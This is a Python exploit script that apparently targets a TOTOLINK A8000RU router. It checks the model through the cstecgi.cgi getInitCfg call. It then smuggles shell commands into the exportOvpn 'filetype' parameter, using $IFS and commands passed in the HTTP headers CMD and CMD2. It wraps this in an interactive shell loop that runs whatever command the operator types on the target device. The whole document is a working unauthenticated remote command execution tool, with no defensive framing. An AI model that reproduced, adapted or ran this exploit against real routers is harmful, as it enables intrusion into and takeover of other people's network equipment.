import argparse
import sys
import requests
import json


def RunCommand(url, command):
    proxies = {"http": "http://172.19.16.1:8080",
               "https": "http://172.19.16.1:8080"}
    request_url = "{0}/cgi-bin/cstecgi.cgi?exportOvpn=&type=user&filetype=gz;/bin/sh$IFS-c$IFS\"$HTTP_CMD\";".format(
        url)
    request_headers = {"CMD": "echo;/bin/sh$IFS-c$IFS\"$HTTP_CMD2\";",
                       "CMD2": "echo;{0};".format(command)}
    r = requests.get(request_url, headers=request_headers)
    # r = requests.get(request_url, headers=request_headers,
                    #  proxies=proxies, verify=False)
    return "\n".join(r.text.strip().splitlines()[:-1])


def CheckConfig(url):
    request_url = "{0}/cgi-bin/cstecgi.cgi".format(url)
    request_headers = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
    request_json = {"topicurl": "getInitCfg"}
    r = requests.post(request_url, headers=request_headers, json=request_json)
    cfg = json.loads(r.text[r.text.find("{"):])
    return cfg


def main():
    print("[*] Author: ...")
    parser = argparse.ArgumentParser()
    parser.add_argument('--url', '-u', help='target\'s url')
    args = parser.parse_args()
    if args.url == None:
        parser.print_help()
        sys.exit()

    url = args.url
    if url[-1] == "/":
        url = url[:-1]
    if "http://" not in url and "https://" not in url:
        url = "http://{0}".format(url)

    cfg = CheckConfig(url)
    # print(cfg)
    if "error" in cfg:
        print("error: {0}".format(cfg["error"]))
        exit(1)

    if ("model" in cfg and cfg["model"] != "A8000RU"):
        print("Wrong model!")
        exit(1)

    if "fmVersion" in cfg:
        print("fmVersion: {0}\n".format(cfg["fmVersion"]))

    while True:
        cmd = input('$ ')
        if cmd == 'exit' or cmd == 'quit':
            print("[+] BYE!")
            break
        output = RunCommand(url, cmd)
        print(output)


if __name__ == '__main__':
    main()
